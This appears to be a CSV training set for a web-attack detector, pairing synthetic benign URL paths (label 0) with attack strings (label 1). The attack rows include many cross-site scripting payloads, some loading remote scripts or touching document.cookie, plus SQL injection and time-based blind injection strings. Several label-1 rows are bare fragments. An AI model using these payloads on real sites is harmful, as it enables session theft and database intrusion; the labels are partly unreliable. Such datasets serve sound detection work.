payload,label
/login.html?user=book311,0
/product/detail?category=shoes834,0
"' UNION SELECT version(),2,3--",1
/search?user=profile962,0
/home?page=profile495,0
/search?user=book655,0
/index.php?id=apple822,0
/home?q=hải393,0
/api/v1/users?user=contact413,0
"""><IMG SRC=""jav&#x09;ascript:alert(document.cookie);"">",1
/login.html?q=123782,0
/product/detail?q=hải503,0
/index.php?page=book602,0
/search?category=apple925,0
/assets/style.css?page=123744,0
/api/v1/users?category=123347,0
/api/v1/users?q=kma107,0
/api/v1/users?page=hải669,0
/assets/style.css?token=shoes608,0
/index.php?category=20268,0
/search?user=hải666,0
/api/v1/users?user=kma111,0
/api/v1/users?token=shoes814,0
<script>decipher(document.forms.cipher); alert(document.forms.cipher.stream.value); document.forms.cipher.stream.value = document.forms.cipher.stream_copy.value;</script>,1
/search?page=2026712,0
/api/v1/users?token=contact381,0
/product/detail?token=apple891,0
/assets/style.css?q=contact363,0
/assets/style.css?id=book784,0
<img/src=aaa.jpg onerror=prompt(1);>,1
/api/v1/users?user=kma702,0
/login.html?q=profile849,0
/api/v1/users?category=123363,0
/api/v1/users?category=apple695,0
/assets/style.css?id=contact400,0
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
/login.html?q=contact170,0
/assets/style.css?category=kma188,0
/assets/style.css?q=profile478,0
/home?user=apple773,0
/home?q=contact289,0
/home?user=kma120,0
"<img src=""mocha:document.cookie=true;"">",1
/home?id=book238,0
/assets/style.css?q=shoes669,0
/login.html?user=admin842,0
"<svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:\u0061lert(1);""></g></svg>",1
/assets/style.css?q=profile827,0
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",1
/search?id=apple856,0
/home?q=shoes516,0
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
/product/detail?q=shoes374,0
/home?category=profile289,0
/search?category=shoes215,0
/api/v1/users?page=profile954,0
&#x0003C;,1
/api/v1/users?q=shoes996,0
/home?q=apple689,0
/assets/style.css?id=profile37,0
/search?page=202672,0
/product/detail?id=admin17,0
/assets/style.css?page=shoes921,0
' AND 1=(SELECT COUNT(*) FROM tablename)--,1
/search?page=hải951,0
/search?q=2026161,0
/home?page=2026164,0
/assets/style.css?page=123885,0
/home?q=2026540,0
/assets/style.css?page=kma985,0
/product/detail?id=profile957,0
&#60&#105&#102&#114&#97&#109&#101&#32&#115&#114&#99&#61&#104&#116&#116&#112&#58&#47&#47&#116&#101&#115&#116&#46&#100&#101&#62,1
/search?id=shoes727,0
/api/v1/users?page=shoes151,0
/home?user=123984,0
/assets/style.css?q=admin254,0
/product/detail?q=hải586,0
/login.html?page=2026838,0
/login.html?page=shoes210,0
/login.html?page=admin462,0
/home?category=contact386,0
/api/v1/users?category=profile86,0
/login.html?id=profile202,0
<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js></SCRIPT>,1
/index.php?q=shoes811,0
<textarea autofocus onfocus=alert(1)>,1
/assets/style.css?id=contact22,0
/assets/style.css?user=hải314,0
/login.html?token=book825,0
/login.html?q=2026980,0
"<STYLE TYPE=""text/javascript"">document.cookie=true;</STYLE>",1
/index.php?page=kma413,0
/product/detail?category=hải439,0
/api/v1/users?page=123501,0
%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
/api/v1/users?token=profile888,0
/home?page=contact193,0
/search?category=contact465,0
/search?user=shoes79,0
/api/v1/users?q=profile324,0
/api/v1/users?category=admin560,0
/search?category=apple155,0
¼script¾alert(¢CrossSiteScripting¢)¼/script¾,1
/assets/style.css?token=hải154,0
/api/v1/users?user=shoes455,0
/product/detail?id=shoes557,0
/index.php?user=book621,0
/assets/style.css?id=shoes829,0
/login.html?id=12390,0
"</textarea>""><script>prompt(Evan)</script>",1
/index.php?token=123104,0
/api/v1/users?user=kma411,0
/login.html?id=12317,0
/home?q=contact594,0
/search?user=profile406,0
' OR 'a'='a,1
">""<BODY BACKGROUND=""javascript:document.cookie=true;"">",1
/search?page=2026471,0
"<BGSOUND SRC=""javascript:alert('XSS');"">",1
/api/v1/users?id=book526,0
/assets/style.css?user=contact803,0
/index.php?category=123889,0
/home?page=1234,0
/product/detail?token=profile440,0
/search?token=profile972,0
/product/detail?id=kma212,0
/assets/style.css?page=123509,0
/login.html?category=shoes349,0
/index.php?token=profile500,0
/search?category=kma113,0
/search?page=2026595,0
/api/v1/users?user=hải856,0
/search?page=contact770,0
/home?user=kma853,0
/home?category=shoes576,0
/login.html?page=contact512,0
/login.html?user=123673,0
/login.html?q=book790,0
/assets/style.css?q=admin202,0
/product/detail?user=2026212,0
/product/detail?token=book656,0
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1
/index.php?category=profile703,0
/index.php?user=profile25,0
/assets/style.css?user=hải64,0
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},1
/assets/style.css?page=2026484,0
/api/v1/users?category=123515,0
/search?user=123365,0
/api/v1/users?token=2026937,0
/search?q=hải846,0
/api/v1/users?user=admin10,0
/login.html?id=book73,0
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('CrossSiteScripting');"">",1
/api/v1/users?id=123740,0
/home?q=2026394,0
/index.php?q=2026220,0
/home?user=contact94,0
/search?category=2026952,0
"""><iframe src='' onload=alert('mphone')>",1
') OR '1'='1'/*,1
/search?category=apple569,0
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",1
/api/v1/users?page=hải391,0
/index.php?id=kma242,0
/login.html?page=hải38,0
/search?category=123925,0
/product/detail?page=admin224,0
/login.html?page=book583,0
/login.html?id=hải728,0
/index.php?page=admin543,0
/search?category=book44,0
/home?id=123197,0
/product/detail?token=shoes812,0
/search?token=apple32,0
/home?token=contact49,0
"<STYLE>BODY{-moz-binding:url(""http://vulnerability-lab.com/CrossSiteScriptingmoz.xml#CrossSiteScripting"")}</STYLE>",1
/search?q=book290,0
B,1
/search?user=kma236,0
/api/v1/users?token=2026241,0
/api/v1/users?token=123905,0
/home?id=123403,0
/login.html?category=profile724,0
/index.php?token=apple899,0
/home?user=apple856,0
/search?token=shoes77,0
%u002f%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e,1
""") OR ""1""=""1""#",1
/product/detail?user=apple99,0
/product/detail?q=hải657,0
/product/detail?category=123716,0
/login.html?page=book877,0
/search?page=12334,0
/assets/style.css?user=book683,0
/api/v1/users?q=shoes827,0
/product/detail?page=2026678,0
"\'\"");|]*{%0d%0a<%00",1
/home?id=profile585,0
/home?token=profile973,0
"<XML ID=""CrossSiteScripting""><I><B><IMG SRC=""javas<!-- -->cript:document.cookie=true""></B></I></XML><SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
/api/v1/users?user=book248,0
/search?q=apple660,0
/index.php?category=profile484,0
add topic <iframe src=http://www.vulnerability-lab.com>,1
/assets/style.css?page=kma176,0
/home?category=2026796,0
/search?id=123927,0
/assets/style.css?page=profile736,0
/product/detail?page=contact611,0
"<TABLE><TD BACKGROUND=""javascript:alert('CrossSiteScripting')"">",1
/home?category=shoes91,0
/api/v1/users?id=kma167,0
/login.html?token=2026833,0
/search?page=kma682,0
/login.html?page=shoes554,0
/index.php?q=admin230,0
/assets/style.css?category=book127,0
/search?token=admin726,0
/index.php?category=2026721,0
/index.php?q=admin243,0
/search?id=2026219,0
/api/v1/users?category=hải977,0
/home?id=2026408,0
/product/detail?id=contact930,0
/product/detail?user=123735,0
/assets/style.css?page=123618,0
/login.html?id=profile814,0
/product/detail?page=admin423,0
/index.php?q=book985,0
/login.html?id=123528,0
/search?page=123415,0
/assets/style.css?token=2026632,0
/product/detail?category=admin48,0
/search?id=kma387,0
"<div style=""width: expression(document.cookie=true;);"">",1
"<<SCRIPT>alert(""CrossSiteScripting"");//<</SCRIPT>",1
/index.php?token=profile282,0
/api/v1/users?category=book286,0
/index.php?token=123463,0
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",1
/search?id=hải165,0
<!</textarea <body onload='alert(1)'>,1
"<IMG SRC=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",1
/index.php?category=contact750,0
/api/v1/users?token=admin341,0
/assets/style.css?user=hải431,0
/assets/style.css?q=12387,0
/api/v1/users?q=123577,0
/api/v1/users?category=book636,0
""");</script><script>alert(1)</script>""",1
/login.html?user=123680,0
/assets/style.css?id=profile168,0
/search?token=admin508,0
/index.php?q=shoes617,0
/api/v1/users?q=book523,0
/index.php?q=2026320,0
/login.html?page=book277,0
/product/detail?q=admin145,0
/search?category=2026962,0
/product/detail?token=admin678,0
/api/v1/users?user=contact662,0
/product/detail?category=123160,0
/product/detail?category=2026518,0
/product/detail?q=2026919,0
?attribute='</script><body onload&value=alert(document.cookie),1
/home?token=2026628,0
/api/v1/users?user=hải743,0
/assets/style.css?id=admin574,0
/product/detail?q=hải708,0
&#000060,1
/product/detail?id=contact801,0
/login.html?category=book635,0
/login.html?token=hải678,0
/product/detail?q=apple874,0
/home?id=contact166,0
">""<STYLE>.CrossSiteScripting{background-image:url(""javascript:document.cookie=true"");}</STYLE><A CLASS=CrossSiteScripting></A>",1
/assets/style.css?q=admin812,0
/index.php?id=shoes638,0
Cross Site Scripting Strings Restriction Bypass String to Charcode,1
/api/v1/users?category=profile250,0
/home?user=admin128,0
/login.html?page=book420,0
/login.html?token=12364,0
/index.php?user=profile890,0
/home?user=shoes297,0
/search?token=contact469,0
/api/v1/users?user=123159,0
&#x003C,1
/api/v1/users?category=apple7,0
/login.html?user=shoes15,0
/search?q=book308,0
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1
/search?page=2026825,0
/assets/style.css?q=profile272,0
/login.html?user=admin966,0
/product/detail?category=profile764,0
/login.html?category=kma806,0
/product/detail?user=profile51,0
/index.php?token=contact258,0
"<BODY BACKGROUND=""javascript:alert('CrossSiteScripting')"">",1
/api/v1/users?token=kma139,0
/api/v1/users?id=hải952,0
/login.html?q=123508,0
/index.php?q=kma559,0
/login.html?page=admin480,0
/api/v1/users?q=admin567,0
/login.html?category=2026705,0
/product/detail?token=apple272,0
/product/detail?page=contact494,0
/login.html?category=hải132,0
/api/v1/users?page=admin354,0
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=jAvAsCriPt:aLeRt('CroSsSiteScrIpting');"">",1
/home?user=shoes207,0
/product/detail?page=2026367,0
/search?user=hải605,0
/api/v1/users?page=book87,0
/index.php?category=admin62,0
/product/detail?user=admin450,0
/login.html?q=profile436,0
/login.html?page=kma129,0
/login.html?id=book380,0
/home?id=2026816,0
/assets/style.css?category=apple884,0
/product/detail?user=profile611,0
">""<script>document.cookie=true;//--></script>",1
/home?token=contact263,0
"<A HREF=""htt	p://6&#9;6.000146.0x7.147/"">XSS</A>",1
/login.html?q=contact435,0
"<t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>alert(""XSS"")</SCRIPT>"">",1
/assets/style.css?page=2026897,0
""") OR (""1""=""1""#",1
">""<img src=&{document.cookie=true;};>",1
"<meta content=""&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1
/home?page=hải253,0
/home?page=profile73,0
/product/detail?category=apple726,0
/product/detail?page=apple909,0
/api/v1/users?q=kma123,0
""" type=""image"" src=""dontcare.jpg"" onerror=""alert(123)",1
"<style type=""text/javascript"">document.cookie=true;</style>",1
">""<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>",1
/index.php?user=hải838,0
/api/v1/users?page=admin529,0
/index.php?user=profile599,0
"<CrossSiteScripting STYLE=""behavior: url(CrossSiteScripting.htc);"">",1
/api/v1/users?page=hải385,0
/assets/style.css?q=admin119,0
/product/detail?token=book834,0
/api/v1/users?page=shoes362,0
/index.php?token=kma37,0
/product/detail?category=book362,0
/api/v1/users,0
&#X00003C;,1
/product/detail?user=2026441,0
/product/detail?category=admin832,0
"<IMG STYLE=""CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)"">",1
"<object data=""javascript:alert(0)"">",1
/login.html?category=hải406,0
/index.php?q=admin109,0
/login.html?category=contact52,0
/login.html?q=hải479,0
/product/detail?user=2026271,0
/assets/style.css?q=admin112,0
/assets/style.css?token=12366,0
/api/v1/users?q=profile280,0
1' AND 1=2,1
/index.php?category=shoes954,0
/api/v1/users?category=kma892,0
/api/v1/users?id=hải550,0
/index.php?user=apple697,0
/api/v1/users?user=2026135,0
"""+style=""bahaviour:expression(function{}{ alert('xxs') }(this)}'",1
/login.html?token=shoes944,0
/login.html?token=profile277,0
/login.html?q=hải381,0
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('CrossSiteScripting')</SCRIPT>"">",1
/index.php?id=123820,0
/search?page=hải817,0
/home?page=profile77,0
/assets/style.css?user=apple896,0
/login.html?page=shoes12,0
/home?page=admin981,0
/login.html?page=hải587,0
/search?category=kma823,0
/api/v1/users?category=book252,0
/login.html?category=book778,0
/search?page=admin557,0
"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",1
/login.html?q=profile897,0
/home?q=profile12,0
/search?token=contact175,0
c,1
/search?id=book357,0
/home?user=shoes641,0
/api/v1/users?id=kma449,0
=,1
/product/detail?token=shoes25,0
/login.html?page=123524,0
/index.php?category=apple291,0
/login.html?id=apple204,0
/api/v1/users?q=book32,0
/assets/style.css?page=kma867,0
/search?page=contact762,0
/api/v1/users?page=kma909,0
/index.php?q=shoes562,0
/index.php?page=contact366,0
/login.html?id=profile716,0
/index.php?category=book837,0
/login.html?page=hải249,0
/login.html?page=profile294,0
/product/detail?id=apple995,0
/assets/style.css?category=admin924,0
/login.html?category=123657,0
"""><img src=x onerror=window.open('https://www.google.com/');>",1
/login.html?q=2026109,0
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,1
<audio src=x onerror=prompt(1);>,1
/index.php?id=hải7,0
/product/detail?token=contact891,0
/api/v1/users?token=shoes274,0
/product/detail?page=admin518,0
'OR%0c1=1--,1
/home?category=contact815,0
/api/v1/users?id=123510,0
"<IMG SRC=""javascript:alert('CrossSiteScripting');"">",1
/login.html?token=book176,0
/assets/style.css?id=2026249,0
/search?q=hải628,0
"-1<IMG DYNSRC=""javascript:document.cookie=true;"">",1
/login.html?user=apple563,0
/assets/style.css?user=profile770,0
/product/detail?id=hải614,0
/api/v1/users?id=profile265,0
/index.php?q=apple346,0
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,1
/home?id=123253,0
/index.php?q=123361,0
/search?q=contact47,0
/index.php?q=kma284,0
/login.html?id=apple357,0
/login.html?id=kma287,0
/home?page=admin420,0
/product/detail?token=shoes341,0
/api/v1/users?category=hải34,0
/index.php?user=apple179,0
/api/v1/users?token=shoes79,0
/assets/style.css?user=202646,0
/api/v1/users?q=kma575,0
/search?page=book744,0
/home?token=profile737,0
/home?id=12314,0
/login.html?page=admin709,0
/api/v1/users?category=2026655,0
/product/detail?category=2026132,0
/product/detail?token=apple923,0
/product/detail?page=123762,0
/home?q=admin65,0
/product/detail?category=2026941,0
/index.php?page=123629,0
/search?id=profile802,0
<channel>,1
/search?id=2026501,0
/login.html?q=hải910,0
/search?token=2026372,0
/api/v1/users?q=contact5,0
/index.php?q=kma234,0
/product/detail?page=contact642,0
/api/v1/users?category=apple254,0
/api/v1/users?user=hải483,0
/login.html?id=admin860,0
/product/detail?user=kma365,0
/assets/style.css?q=2026406,0
/product/detail?user=admin760,0
/product/detail?page=123631,0
/assets/style.css?page=apple259,0
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",1
/login.html?user=123275,0
/api/v1/users?user=kma337,0
/api/v1/users?q=book905,0
/api/v1/users?q=book747,0
/assets/style.css?q=hải171,0
/assets/style.css?category=admin634,0
/home?token=book663,0
/login.html?category=shoes831,0
/api/v1/users?q=book687,0
/product/detail?category=2026142,0
/home?page=contact220,0
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",1
/index.php?user=hải854,0
/assets/style.css?category=admin752,0
/home?q=12385,0
/product/detail?page=profile709,0
/search?category=book658,0
/product/detail?user=shoes470,0
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1
/api/v1/users?id=hải403,0
/home?id=2026669,0
/index.php?category=apple84,0
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",1
/product/detail?token=contact132,0
/assets/style.css?category=hải46,0
/index.php?category=contact865,0
/home?q=contact597,0
/login.html?user=2026294,0
/login.html?user=admin766,0
/search?q=123911,0
/product/detail?category=profile204,0
%3E%22%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E,1
/product/detail?category=shoes487,0
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,1
/assets/style.css?category=admin101,0
/login.html?id=kma84,0
/index.php?user=kma401,0
/index.php?category=apple757,0
/home?category=profile766,0
/index.php?user=contact139,0
/login.html?page=123545,0
"<iframe src=""javascript:document.cookie=true;>",1
/product/detail?id=2026634,0
/assets/style.css?token=123297,0
/index.php?token=apple283,0
/search?page=2026609,0
/product/detail?q=shoes613,0
/home?user=hải974,0
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1
/api/v1/users?q=2026690,0
/index.php?token=12331,0
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>""></BODY></HTML>",1
/search?category=2026614,0
/login.html?token=hải806,0
/index.php?q=apple729,0
/api/v1/users?token=profile731,0
/login.html?user=2026784,0
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
/home?id=contact596,0
/assets/style.css?user=book987,0
/index.php?q=profile95,0
/api/v1/users?id=book767,0
/product/detail?user=contact160,0
"<rss version=""2.0"">",1
/search?id=123786,0
/api/v1/users?token=apple695,0
/login.html?token=admin640,0
/search?user=book497,0
/api/v1/users?id=book608,0
"'""onmouseover=""prompt(1)""",1
/search?id=apple48,0
/search?category=hải526,0
/home?category=profile540,0
/home?token=admin451,0
"<input type=""image"" formaction=JaVaScript:alert(0)>",1
/assets/style.css?q=apple5,0
/search?token=shoes769,0
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
/search?q=book500,0
/assets/style.css?page=contact944,0
/home?page=shoes633,0
</script><script type=text/javascript>alert(123)</script>,1
/home?user=kma649,0
/home?user=kma80,0
/product/detail?id=shoes662,0
/login.html?user=kma342,0
/product/detail?q=2026600,0
/home?category=book397,0
/home?q=123936,0
/login.html?page=book40,0
/product/detail?token=2026792,0
/home?category=profile537,0
/search?id=shoes366,0
/home?id=apple990,0
/login.html?category=hải836,0
"<STYLE>li {list-style-image: url(""javascript:alert('CrossSiteScripting')"");}</STYLE><UL><LI>CrossSiteScripting",1
/home?id=kma102,0
"""><svg/onload;=alert(1)>",1
/index.php?token=contact345,0
/index.php?page=profile448,0
/assets/style.css?user=contact78,0
/index.php?user=kma799,0
/product/detail?id=apple788,0
eval(v+l+a+b);,1
/search?token=123527,0
/login.html?token=hải748,0
/product/detail?id=kma770,0
/assets/style.css?user=2026295,0
""" onmouseover=""prompt(0) x=""",1
/search?token=admin879,0
/home?token=contact417,0
/index.php?token=2026526,0
/login.html?token=shoes931,0
/home?token=book283,0
/login.html?page=profile207,0
<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>,1
/index.php?token=apple686,0
/search?user=apple563,0
&<script>document.cookie=true;</script>,1
/product/detail?user=contact284,0
/search?token=123315,0
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
<><><><><><a onmouseover=prompt(1337)>XSS</a>,1
/product/detail?q=apple441,0
/login.html?page=hải453,0
/login.html?category=profile135,0
/index.php?user=profile88,0
/index.php?category=admin180,0
/index.php?category=kma367,0
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,1
/product/detail?category=123818,0
/home?q=contact600,0
/product/detail?q=kma787,0
/index.php?q=profile893,0
%3CSCRIPT%3Ealert%283%29%3C%2FSCRIPT%3E,1
/assets/style.css?id=kma23,0
/home?token=shoes97,0
/product/detail?q=hải540,0
"<BGSOUND SRC=""javascript:alert('CrossSiteScripting');"">",1
/login.html?user=contact330,0
' ORDER BY 1--,1
/api/v1/users?page=book809,0
/home?q=contact211,0
/index.php?category=kma982,0
/search?user=profile228,0
/login.html?id=kma90,0
/login.html?token=apple770,0
/api/v1/users?category=apple282,0
/home?page=profile751,0
/login.html?token=book918,0
/assets/style.css?page=contact132,0
/index.php?id=hải625,0
/product/detail?token=shoes127,0
/product/detail?category=apple445,0
/home?category=profile542,0
/product/detail?user=profile346,0
/search?page=2026189,0
/index.php?id=admin194,0
/index.php?q=profile375,0
/index.php?id=admin548,0
/api/v1/users?user=shoes504,0
/search?user=shoes292,0
/assets/style.css?page=kma526,0
/assets/style.css?token=profile409,0
/search?page=shoes102,0
/product/detail?category=apple315,0
/index.php?id=kma579,0
/index.php?category=contact190,0
/product/detail?page=apple756,0
/index.php?category=2026314,0
/assets/style.css?q=2026355,0
/assets/style.css?q=shoes22,0
/product/detail?q=admin425,0
/product/detail?q=12312,0
/index.php?q=123216,0
/api/v1/users?user=shoes781,0
/login.html?category=hải175,0
/assets/style.css?token=profile524,0
/product/detail?q=admin464,0
/product/detail?category=apple555,0
%22%20onload=%22this.src='http://www.unirostock.de';this.onload=function(){};%22%20x=%22,1
/search?q=profile538,0
/home?user=shoes514,0
/search?id=kma58,0
"?>'""><script>alert(90889)</script>",1
